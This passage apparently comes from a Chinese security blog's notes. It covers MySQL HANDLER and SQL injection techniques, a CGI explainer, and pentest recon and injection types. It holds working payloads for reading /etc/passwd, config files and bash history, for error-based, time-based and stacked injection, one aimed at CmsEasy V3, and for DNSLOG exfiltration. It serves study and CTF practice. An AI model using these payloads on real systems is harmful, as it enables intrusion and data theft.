title="mysql查询语句-handler"></a>mysql查询语句-handler</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p></blockquote><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>handler语句的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><p>​    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>​    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>​    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><pre><code>通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。如果我们不想浏览一个表的所有行，可以使用where和limit子句。</code></pre><h1 id="预编译绕过"><a href="#预编译绕过" class="headerlink" title="预编译绕过"></a>预编译绕过</h1><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;;set @sql = CONCAT(&apos;se&apos;,&apos;lect * from `1919810931114514`;&apos;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure><h1 id="load-file-的使用"><a href="#load-file-的使用" class="headerlink" title="load_file()的使用"></a>load_file()的使用</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 要有file_priv权限</span><br><span class="line"><span class="number">2.</span> 知道文件绝对路径</span><br><span class="line"><span class="number">3.</span> 对web目录有读权限  </span><br><span class="line">注：若过滤了单引号，则可以将函数中的字符进行hex编码</span><br></pre></td></tr></table></figure><p><code>select @@secure_file_priv</code><br>secure_file_priv</p><ul><li>1、限制mysqld 不允许导入 | 导出<br><code>--secure_file_prive=null</code></li><li>2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下<br><code>--secure_file_priv=/tmp/</code></li><li>3、不对mysqld 的导入 | 导出做限制<br><code>--secure_file_priv=</code></li></ul><h2 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h2><p>读/etc/init.d下的东西，这里有配置文件路径</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/init.d/httpd'</span>)</span><br></pre></td></tr></table></figure><p>得到web安装路径</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/apache/conf/httpd.conf'</span>)</span><br></pre></td></tr></table></figure><p>读取密码文件</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">'var</span>/www/html/xxx.com/php/conn.inc.php')</span><br></pre></td></tr></table></figure><p>  读取系统中所有的用户和用户的主要信息 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure><p>查看用户的history</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure><h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">SQL注入绕过技巧</a> </p><ul><li><p>空格</p><ul><li>/**/</li></ul></li><li><p>=</p><ul><li>like</li><li>regexp</li><li>!(&lt;&gt;)</li></ul></li><li><p>‘</p><ul><li>转义符<code>\</code></li><li>16进制(例如：ctf -&gt; 0x637466)</li></ul></li><li><p>，</p><ul><li>union注入使用join，例如<code>3&#39; union select * from (select 1) a join (select 2 ) b %23</code></li><li>substr from for</li><li>if-&gt;case when</li></ul></li><li><p>无数字字母</p><p>其它重要绕过参考：<a href="https://xz.aliyun.com/t/5505#toc-2" target="_blank" rel="noopener">SQL注入有趣姿势总结</a><br><a href="https://www.smi1e.top/sql注入笔记/" target="_blank" rel="noopener">Sql注入笔记</a><br><a href="http://www.sohu.com/a/157844303_354899" target="_blank" rel="noopener">SQL注入之骚姿势小记</a><br><a href="https://www.cnblogs.com/sijidou/p/10243458.html" target="_blank" rel="noopener">sql注入总结(一)–2018自我整理</a> </p><p>information_schema 被过滤</p></li></ul><p><a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">无需“in”的SQL盲注</a> </p><blockquote><p>sys.schema_table_statistics_with_buffer </p><p> <a href="https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/" target="_blank" rel="noopener">mysql.innodb_table_stats</a> </p><p> sys.x$schema_flattened_keys</p><p> sys.schema_table_statistics  </p></blockquote><blockquote><p>Tips：<br>substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。<br>那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序。 </p></blockquote><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p> 如果一个表只包含一列，那么很轻易就可在不知道列名的情况下检索出数据，只需一个简单的<code>SUBSTR((SELECT * FROM table),1,1)=&#39;x&#39;</code>就可，但如果一个表包含多个列，那么这个查询就会抛出一个错误。不过这里有个技巧，就是将查询语句与相同数量的列进行比较！ </p><p>关键payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 ^ ( (select 1,1) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure><p>这里的1用来探测列数，通过删减1的个数来探测列的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 ^ ( (select 1,&apos;f&apos;) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure><p>原理：</p><ul><li>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</li><li>当小于等于f的时候，是1^0，回显Nu1L，当大于f，即g之类的字符时，是1^1，返回Error Occured When Fetch Result.</li><li>所以最后的mid要减一才是正确的字符</li><li>这里我们传入十六进制，mysql会自动将十六进制转为字符</li><li>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </li></ul><h1 id="深入探索insert注入与update注入"><a href="#深入探索insert注入与update注入" class="headerlink" title="深入探索insert注入与update注入"></a>深入探索insert注入与update注入</h1><p><a href="https://www.dazhuanlan.com/2019/12/09/5dee607fccd80/" target="_blank" rel="noopener">深入探索insert注入与update注入</a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。<br>在我们代码审计的过程中产生这个注入的原因有两个<br>1.character_set_client=gbk(SET NAMES的误用)<br>2.mysql_real_escape_string()的错误使用 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CGI模式</title>
      <link href="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">简单说明CGI和动态请求是什么</a></p><blockquote><p>CGI是common gateway interface的缩写，大家都译作通用网关接口 </p><p>这个规则会将header中的proxy参数设置为环境变量HTTP_PROXY </p></blockquote><a id="more"></a><h3 id="CGI介绍"><a href="#CGI介绍" class="headerlink" title="CGI介绍"></a>CGI介绍</h3><p>​    总所周知，web服务器所处理的任务都是静态的，假如其要想处理动态的任务，则需要web应用程序的帮助，比如PHP，jsp，python，perl等为了将web服务器的动态请求传递给这些应用程序，依靠cgi协议。</p><p> 简单的cgi工作方式： </p><p><img src="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/CGI%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F.png" alt></p><blockquote><p> 有多种方式可以执行cgi程序，但对http的请求方法来说，只有get和post两种方法允许执行cgi脚本(即上面的search程序)。实际上post方法的内部本质还是get方法，只不过在发送http请求时，get和post方法对url中的参数处理方式不一样而已。 </p></blockquote><p> 通过cgi协议，再结合已搭建好的web应用程序，就可以让web server也能”处理”动态请求(或者说，当用户访问某个特定资源时，可以触发执行某个web应用程序来实现特定功能) ,例如，在谷歌搜索栏中搜索一个关键词”http”，对应的URL为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.google.com/search?q=http&amp;oq=http&amp;aqs=chrome..69i57j69i60l4j0.1136j0j8&amp;sourceid=chrome&amp;ie=UTF-8</span><br></pre></td></tr></table></figure><p>当谷歌的web server收到该请求后，先分析该url，从中知道了要执行search程序，并且还知道了一系列要传递给search的参数及其对应的value。web server会将这些程序参数和其它一些环境变量根据cgi协议通过TCP或套接字等方式传递给已启动的cgi程序(可能是cgi进程，或者是已加载的模块cgi模块)。当cgi进程接收到web server的请求后，调用search程序并执行，同时还会传递参数给search程序。search执行结束后，cgi进程/线程将处理结果返回给web server，web server再返回给浏览器。</p><p>任何一种语言都能编写CGI，只不过有些语言比较擅长，有些语言则非常繁琐，例如用bash shell开发，那么需要用echo等打印语句将执行结果放在巨多无比的html的标签中输出给客户端。常用于编写CGI的语言有perl、php、python等，java也一样能写，但java的servlet完全能实现CGI的功能，且更优化、更利于开发。</p><h3 id="各种术语释疑"><a href="#各种术语释疑" class="headerlink" title="各种术语释疑"></a>各种术语释疑</h3><p> 刚接触cgi概念的时候肯定会有一堆疑问，这到底是什么鬼，处理动态内容的东西不是像php一样的应用程序吗 ？</p><p>以php为例，我将一次动态请求相关的概念大致都简单解释一遍。</p><ol><li><code>cgi</code>：它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序。</li><li><code>fastcgi</code>：也是一种协议，只不过是cgi的优化版。cgi的性能较烂，fastcgi则在其基础上进行了改进。</li><li><code>php-cgi</code>：fastcgi是一种协议，而php-cgi实现了这种协议。不过这种实现比较烂。它是单进程的，一个进程处理一个请求，处理结束后进程就销毁。</li><li><code>php-fmp</code>：是对php-cgi的改进版，它直接管理多个php-cgi进程/线程。也就是说，<strong>php-fpm是php-cgi的进程管理器</strong>因此它也算是fastcgi协议的实现。在一定程度上讲，php-fpm与php的关系，和tomcat对java的关系是类似的。</li><li><code>cgi进程/线程</code>：在php上，就是php-cgi进程/线程。专门用于接收web server的动态请求，<strong>调用并初始化zend虚拟机</strong>。</li><li><code>cgi脚本</code>：被执行的php源代码文件。</li><li><code>zend虚拟机</code>：对php文件做词法分析、语法分析、编译成opcode，并执行。最后关闭zend虚拟机。</li><li><code>cgi进程/线程和zend虚拟机的关系</code>：cgi进程调用并初始化zend虚拟机的各种环境。</li></ol><p>以php-fpm为例，web server从转发动态请求到结束的过程大致如下：</p><p>![](CGI模式/web server从转发动态请求到结束过程.png)</p><h3 id="web-server和CGI的交互模式"><a href="#web-server和CGI的交互模式" class="headerlink" title="web server和CGI的交互模式"></a>web server和CGI的交互模式</h3><p>​    web server对cgi进程/线程来说，它的作用就是发起动态处理请求，传递一些参数和环境变量，最后接收cgi的返回结果。再通俗而不严谨地说，web server通过cgi/fastcgi协议将动态请求转发给执行cgi脚本的应用程序。通过下面httpd.conf中的转发配置应该很容易理解(httpd和php-fpm的交互)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProxyRequests off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/usr/local/apache/htdocs/$1</span><br></pre></td></tr></table></figure><p>以最典型的apache httpd和php为例，对于httpd来说，web server和php-cgi有3种交互模式。</p><ul><li><code>cgi模式</code>：httpd接收到一个动态请求就fork一个cgi进程，cgi进程返回结果给httpd进程后自我销毁。</li><li><code>动态模块模式</code>：将php-cgi的模块(例如php5_module)编译进httpd。在httpd启动时会加载模块，加载时也将对应的模块激活，php-cgi也就启动了。(注：纠正一个小小错误，很多人以为动态编译的模块是可以在需要的时候随时加载调用，不需要的时候它们就停止了，实际上不是这样的。和静态编译的模块一样，动态加载的模块在被加载时就被加入到激活链表中，无论是否使用它，它都已经运行在apache httpd的内部。可参考LoadModule指令的官方手册)</li><li><code>php-fpm模式</code>：使用php-fpm管理php-cgi，此时httpd不再控制php-cgi进程的启动。可以将php-fpm独立运行在非web服务器上，实现所谓的动静分离。</li></ul><p>实际上，借助模块mod_fastcgi还可以实现fastcgi模式。同cgi一样，管理模式的先天缺陷决定了这并不是一种好方法。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记</title>
      <link href="/2019/12/14/%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基本渗透流程"><a href="#基本渗透流程" class="headerlink" title="基本渗透流程"></a>基本渗透流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>注册人信息和邮箱,去google或者其他平台搜索敏感信息或者根据信息生成字典准备爆破.</p><h3 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h3><p>内容分发网络 </p><h4 id="检测是否有cdn"><a href="#检测是否有cdn" class="headerlink" title="检测是否有cdn"></a>检测是否有cdn</h4><p>先检测网站是否使用cdn,可以使用多地ping看ip是否唯一</p><a id="more"></a><blockquote><p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a> </p></blockquote><p>或者用nslookup进行检测</p><h4 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h4><h5 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a>查询历史DNS记录</h5><blockquote><p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> ###DNS查询<br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> ###微步在线<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> ###DNS、IP等查询<br><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a> ###CDN查询IP </p><p> 利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。 </p></blockquote><h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote><p>微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>) </p><p>Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>) </p><p>Google 搜索  例如: site:baidu.com -www </p><p>各种子域名扫描器  如:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p></blockquote><h5 id="网络空间引擎搜索法"><a href="#网络空间引擎搜索法" class="headerlink" title="网络空间引擎搜索法"></a>网络空间引擎搜索法</h5><p>如fofa,shodan查找网站相关内容,有可能有真实ip</p><p>还有许多其他方法</p><h4 id="查子域名-c段-旁站"><a href="#查子域名-c段-旁站" class="headerlink" title="查子域名,c段,旁站"></a>查子域名,c段,旁站</h4><blockquote><p>收集C段内部属于目标的ip </p><p>更多的探测主机目标资产 </p><p>旁站：与这个网站在同一个服务器上面的网站。寻找安全薄弱的网站。</p></blockquote><p>子域名扫描工具:<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>c段扫描: nmap、masscan、zenmap和webscancc </p><h3 id="服务器相关信息"><a href="#服务器相关信息" class="headerlink" title="服务器相关信息"></a>服务器相关信息</h3><p>获得网站和服务器信息可以用wappalyzer插件</p><p><img src="/2019/12/14/%E7%AC%94%E8%AE%B0/wappalyzer.png" alt></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>一个站点可能存在的漏洞：sql注入、万能密码（sql注入）、弱口令，敏感信息泄漏，xss,csrf,ssrf，url跳转，命令执行，越权访问，未授权访问，xxe，解析漏洞，文件上传漏洞，ssti，反序列化漏洞等</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><blockquote><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p></blockquote><h4 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><h5 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h5><h6 id="一-数字型注入"><a href="#一-数字型注入" class="headerlink" title="一:数字型注入"></a>一:数字型注入</h6><blockquote><p>在 Web 端大概是 <a href="http://xxx.com/news.php?id=1" target="_blank" rel="noopener">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code>。组合出来的sql注入语句为：select * from news where id=1 and 1=1 </p></blockquote><h6 id="二-字符型注入"><a href="#二-字符型注入" class="headerlink" title="二:字符型注入"></a>二:字符型注入</h6><blockquote><p>在 Web 端大概是 <a href="http://xxx.com/news.php?name=admin" target="_blank" rel="noopener">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code>。注意多了引号。组合出来的sql注入语句为：select * from news where chr=’admin’ and 1=1 ‘ ‘</p><p>闭合单引号chr=’admin’ union select 1,2,3,4 and ‘1’=’1  ====&gt;  chr=’admin’(闭合前面单引号) union select 1,2,3,4 and ‘1’=’1’</p></blockquote><h6 id="三-搜索型注入点"><a href="#三-搜索型注入点" class="headerlink" title="三:搜索型注入点"></a>三:搜索型注入点</h6><blockquote><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p><p>组合出来的sql注入语句为：select * from news where search like ‘%测试 %’ and ‘%1%’=’%1%’</p><p>测试%’ union select 1,2,3,4 and ‘%’=’</p></blockquote><h5 id="按数据注入方式分类"><a href="#按数据注入方式分类" class="headerlink" title="按数据注入方式分类"></a>按数据注入方式分类</h5><h6 id="一-get注入"><a href="#一-get注入" class="headerlink" title="一:get注入"></a>一:get注入</h6><blockquote><p>注入点在url中  如: <code>http://xxx.com/news.php?id=1</code>  </p></blockquote><h6 id="二-post注入"><a href="#二-post注入" class="headerlink" title="二:post注入"></a>二:post注入</h6><blockquote><p>通过post方式数据，注入点在post数据中</p></blockquote><h6 id="三-cookie注入"><a href="#三-cookie注入" class="headerlink" title="三:cookie注入"></a>三:cookie注入</h6><blockquote><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。 </p></blockquote><h6 id="四-HTTP头注入"><a href="#四-HTTP头注入" class="headerlink" title="四:HTTP头注入"></a>四:HTTP头注入</h6><blockquote><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。 </p></blockquote><h5 id="按执行类型分类"><a href="#按执行类型分类" class="headerlink" title="按执行类型分类"></a>按执行类型分类</h5><h6 id="一-基于布尔的盲注"><a href="#一-基于布尔的盲注" class="headerlink" title="一:基于布尔的盲注"></a>一:基于布尔的盲注</h6><blockquote><p>可以根据返回页面判断条件真假的注入。 </p></blockquote><p>页面回显结果可以判断执行结果是true和false</p><p>常用函数</p><blockquote><p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p></blockquote><p>如sqli-labs中less-5</p><blockquote><p><a href="http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;</a> and length(database())&gt;7 %23    判断长度</p><p><a href="http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;</a> and substr(database(),1,1)&gt;’r’ %23  猜测数据库名</p></blockquote><h6 id="二-基于时间的盲注"><a href="#二-基于时间的盲注" class="headerlink" title="二:基于时间的盲注"></a>二:基于时间的盲注</h6><blockquote><p>不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 </p></blockquote><p>如  CmsEasy V3.X.X  中时间注入</p><p>SQL注入点位置：<a href="http://IP:/celive/js/include.php?cmseasylive=1111&amp;departmentid=0" target="_blank" rel="noopener">http://IP:/celive/js/include.php?cmseasylive=1111&amp;departmentid=0</a></p><p>下面是include.php的部分代码</p><blockquote><p>  if (isset($_GET[‘departmentid’])) {</p><p>​    $departmentid = $_GET[‘departmentid’];</p><p>​    $activity_sql = “SELECT <code>id</code> FROM <code>&quot;.$config[&#39;prefix&#39;].&quot;activity</code> WHERE  <code>departmentid</code>=’”.$departmentid.”‘ AND <code>operatorid</code>=’”.$operatorid.”‘“;     </p><p>​    $onlinelink2 = ‘‘;</p><p>​    @$result2 = $db-&gt;my_fetch_array($activity_sql);</p></blockquote><p>分析代码，可以输入到参数departmentid的值会传递到$activity_sql去查询，此处没有做过滤，但也没有回显查询结果和爆错语句，因此可以尝试使用字符型的时间盲注。</p><p>基本payload </p><blockquote><p>include.php?cmseasylive=1111&amp;departmentid=0’ and sleep(5) AND ‘1’=’1 </p><p>include.phpcmseasylive=1111&amp;departmentid=0’+and+if((%s)+regexp’^%s’,sleep(5),0)+and+’1’=’1’</p></blockquote><h6 id="三-基于报错的注入"><a href="#三-基于报错的注入" class="headerlink" title="三:基于报错的注入"></a>三:基于报错的注入</h6><blockquote><p>页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 </p></blockquote><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。 </p><p>常用的报错注入</p><p>1:Duplicate entry报错</p><blockquote><p>一句话概括就是多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息。</p><p>关键是查询时会建立临时表存储数据，不存在键值就插入，group by使插入前rand()会再执行一次，存在就直接值加1 ,造成抛出主键冗余的错误</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+</span><br></pre></td></tr></table></figure><blockquote><p>version()可以替换为需要查询的信息。</p><p>简化语句：</p><p>union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+</p></blockquote><p>2:Xpath报错</p><blockquote><p>updatexml():对xml进行查询和修改     and updatexml(1,concat(0x26,(version()),0x26),1); </p><p>extractvalue():对xml进行查询和修改   and (extractvalue(1,concat(0x26,(version()),0x26))); </p><p>都是最大爆32位。 </p></blockquote><p>3:整形溢出报错</p><p>Mysql&gt;5.5.5</p><p>主要函数：</p><p>exp(x):计算e的x次方</p><blockquote><p>Payload: and (EXP(~(select * from(select version())a)));</p></blockquote><p>Exp()超过710会产生溢出。</p><p>将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。</p><h6 id="四-堆叠注入"><a href="#四-堆叠注入" class="headerlink" title="四:堆叠注入"></a>四:堆叠注入</h6><p> PHP中mysqli_multi_query()函数 </p><blockquote><p>可以同时执行多条语句的执行时的注入。语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。</p><p>1’;show databases;# </p></blockquote><h6 id="五-DNSLOG注入"><a href="#五-DNSLOG注入" class="headerlink" title="五:DNSLOG注入"></a>五:DNSLOG注入</h6><blockquote><p>局限于Windows环境下（UNC路径）</p><p>Mysql版本&gt;=5.5.53就要检查Secure_file_priv这个全局变量是否为空（若为NULL，则不可用)</p></blockquote><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了 </p><blockquote><p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息,简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p></blockquote><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。 </p><p>平台推荐</p><blockquote><p><a href="http://www.dnslog.cn" target="_blank" rel="noopener">http://www.dnslog.cn</a></p><p><a href="http://admin.dnslog.link" target="_blank" rel="noopener">http://admin.dnslog.link</a></p><p><a href="http://ceye.io" target="_blank" rel="noopener">http://ceye.io</a></p></blockquote><p>MySql的盲注时，可以利用内置函数load_file()来完成DNSLOG。load_file()不仅能够加载本地文件，同时也能对诸如\<a href="http://www.test.com/" target="_blank" rel="noopener">www.test.com</a>这样的URL发起请求。</p><p>show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 